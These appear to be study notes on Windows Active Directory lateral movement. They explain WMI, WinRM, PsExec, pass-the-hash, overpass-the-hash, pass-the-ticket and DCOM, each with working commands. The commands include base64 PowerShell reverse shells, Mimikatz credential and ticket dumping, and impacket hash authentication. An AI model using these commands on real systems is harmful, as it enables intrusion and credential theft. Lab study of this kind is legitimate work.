
Cracking  passwords and be time consuming and fruitless and kerberos and NTLM do not use the clear text passwords directly and native tools from MS do not support authentication using password hash.

So, we require different techniques.

- WMI, WinRS and WinRM
- PsExec
- Pass the hash
- DCOM

### WMI and WinRM


##### WMI

WMI is the `Windows Management Instrumentation`. An object-oriented feature that facilitates task automation. It creates processes via the `Create` method from `Win32_Process class`. It communicates through RPC port 135 for remote access and users higher range port for session data.

example using WMI to remotely start the calculator application using CMD:
```
wmic /node:target_ip /user:username /password:userpass process call create "calc"
```

System processes and services always run in session 0[1](https://techcommunity.microsoft.com/t5/ask-the-performance-team/application-compatibility-session-0-isolation/ba-p/372361) as part of session isolation, which was introduced in Windows Vista. Because the WMI Provider Host is running as a system service, the newly created processes through WMI are also spawned in session 0.

Using powershell:

first create a PSCredential object:
```
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
```

then create a Common Information Model (CIM):
```
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options 
$command = 'calc';
```

then:
```
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```


we can then use the above example to instead spawn a reverse shell by instead setting command to a powershell reverse shell:
```
$Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA';
```


##### WinRM & WinRS

WinRM runs on port 5986 and 5985. It exchanges XML messages over http and https. We can interact with this using inbuilt `winrs` (windows remote shell).

For WinRS to work the domain user needs to be a part of administrators or remote management users group `on the target host`.

example:
```
winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"
```

will execute on the target and tell us who we are logged in as and the hostname of the machine.

We could use this for a reverse shell using:
```
winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
```


We can also utilize this method with PowerShell - similar to how we did previously with wmic:
```
$username = 'jen';

$password = 'Nexus123!';

$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;

$credential = New-Object System.Management.Automation.PSCredential $username, 
$secureString;

New-PSSession -ComputerName 192.168.50.73 -Credential $credential

Enter-PSSession 1
```

This will give us a session on the remote host to interact with.


### PsExec

PsExec was created to replace telnet like applications to provide execution of processes on other systems through an interactive console.

For PsExec to work:
- user authenticating against target must be part of the local Administrators group
- ADMIN$ share must be available - default on modern systems
- File and Printer sharing has to be turned on - default on modern systems

`PsExec isnt install be default on windows so we will need to transfer it to a machine we have access to`

example usage using PsExec to execute CMD on a remote host
```
./PsExec64.exe -i  \\Target_host_name -u <domain>\<user> -p <password> cmd
```


### Pass the Hash

This allows us to authenticate against a remote system or service user a users NTLM hash instead of the password. Only works for servers or services using NTLM authentication (not kerberos).

PtH is used by:
- PsExec
- Passing-the-hash toolkit
- impacket

PtH works by authenticating against the victim using the SMB protocol and performs auth using the NTLM hash.

It can start windows services like cmd.exe or PowerShell and communicated with it using named pipes. this is done through use of the Service Control Manager API.

to pass the hash we need:
- SMB connection through the firewall
- Windows File and Printer sharing enabled
- ADMIN$ share to be available
- typically - local administrative rights

we can use impacket locally on our kali against the target:
```
/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
```


This method works for Active Directory domain accounts and the built-in local administrator account. However, due to the [2014 security update](https://support.microsoft.com/en-us/help/2871997/microsoft-security-advisory-update-to-improve-credentials-protection-a), this technique can not be used to authenticate as any other local admin account.


### Overpass the Hash

we can over abuse NTLM hash to gain a full kerberos TGT that we can use to obtain a TGS.

extract the cached credentials using Mimikatz:
```
privilege::debug
sekurlsa::logonpasswords
```

after we have a hash that we want to overpass, we can use Mimikatz to start a PowerShell process in the context of the target user - the new PowerShell prompt will allow us to obtain a kerberos ticket without performing NTLM authentication over the network:
```
sekurlsa::pth /user:target_user /domain:do.main /ntml:hash_we_gathered /run:powershell
```

at this point `whoami` would still show our current user - this is normal as it is checking the current processes token and is not inspecting imported kerberos tickets.

`klist` can be used to list our kerberos tickets

At this point there will be none - we need to prompt an authentication to get the TGT.

```
net use \\target_hostname
```

now that we have prompted an authentication `klist` will show our new kerberos TGT.

Now that we have a TGT we can use any tools that rely on kerberos including the official PsExec application.

In the context of our PowerShell session obtained earlier all we need to do is simply run the application we wish to use.

```
.\PsExec.exe \\files04 cmd
```

TGT is only usable of the machine it was created for and a TGS provides more flexibility.

### Pass the Ticket

pass the ticket takes advantage of TGS which may be exported and reinjected elsewhere on the network then used to authenticate to a specific service. If the tickets belong to the current user then no administrative privileges are required.

we can check out access to a target:
```
ls \\web04\backup
```
for example we receive permission denied.

We can inject another current users TGS into our own session using Mimikatz:
```
privilege::debug
sekurlsa::tickets /export
```

this will pass the LSASS process space in memory for any TGT/TGS which is then saved to disk in the kirbi Mimikatz format.

we can verify the newly generated tickets using:
```
dir *.kirbi
```

we can then select a ticket that we need to access the next target system and make use of it in Mimikatz:
```
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
```

this ticket will now be in our current users session

we can now verify out access to the target:
```
ls \\web04\backup
```
and get a listing of the directory using the newly imported ticket


### DCOM

DCOM is the `Distributed Component Object Model`. It is an extension of COM which is a system for creating software components that interact with each other via same process or cross process interaction. DCOM extends this to include interaction between multiple computers over a network.

DCOM is performed over RPC on TCP port 135.

It requires local administrator access to call the DCOM Service Control Manager - which is essentially an API.

more information about lateral movement using DCOM here: https://www.cybereason.com/blog/dcom-lateral-movement-techniques

we can use the Microsoft Management Console (MMC) COM application to abuse this technology. MMC is used for scripted automation of windows systems. The MMC application class allows us to create application objects which expose the `ExecuteShellCommand` method.

This method allows us to execute any shell command as long as the authenticated user is authorized (default for local admins).

using an elevated powershell prompt we instantiate a remote MMC 2.0 application:
```
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","TARGET_IP"))
```

Once the application object is saved into the _$dcom_ variable, we can pass the required argument to the application via the [**ExecuteShellCommand**](https://docs.microsoft.com/en-us/previous-versions/windows/desktop/mmc/view-executeshellcommand) method:
```
$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
```

we can then use this method to spawn a reverse-shell:
```
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...
AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
```

